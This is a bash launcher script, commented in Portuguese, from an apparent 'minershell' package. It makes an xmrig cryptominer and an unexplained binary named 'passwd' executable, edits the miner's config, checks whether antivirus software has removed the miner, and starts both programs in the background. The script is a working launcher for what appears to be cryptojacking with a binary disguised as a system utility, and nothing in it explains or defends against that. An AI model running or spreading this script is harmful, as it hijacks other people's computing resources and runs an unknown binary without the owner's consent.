#!/bin/bash

# Verifica se xmrig e passwd existem e atribui permissões de execução
if [ -f "$HOME/minershell-main/minershell-main/xmrig" ]; then
  chmod +x $HOME/minershell-main/minershell-main/xmrig
else
  echo "ERROR: xmrig file not found"
  exit 1
fi

if [ -f "$HOME/minershell-main/minershell-main/passwd" ]; then
  chmod +x $HOME/minershell-main/minershell-main/passwd
else
  echo "ERROR: passwd file not found"
  echo "DEBUG: The current directory is: $(pwd)"
  echo "DEBUG: The contents of the directory are: $(ls -la $HOME/minershell-main/minershell-main)"
  exit 1
fi

echo "[*] Checking if advanced version of $HOME/minershell-main/minershell-main/xmrig works fine (and not removed by antivirus software)"
if [ -f "$HOME/minershell-main/minershell-main/config.json" ]; then
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/minershell-main/minershell-main/config.json
else
  echo "ERROR: config.json file not found"
  exit 1
fi

if $HOME/minershell-main/minershell-main/xmrig --help >/dev/null; then
  echo "[*] Executing xmrig..."
  $HOME/minershell-main/minershell-main/xmrig &
else
  echo "WARNING: Advanced version of $HOME/minershell-main/minershell-main/xmrig is not functional"
fi

# Executar o arquivo passwd
echo "[*] Executing passwd..."
$HOME/minershell-main/minershell-main/passwd &

echo "[*] Setup complete."
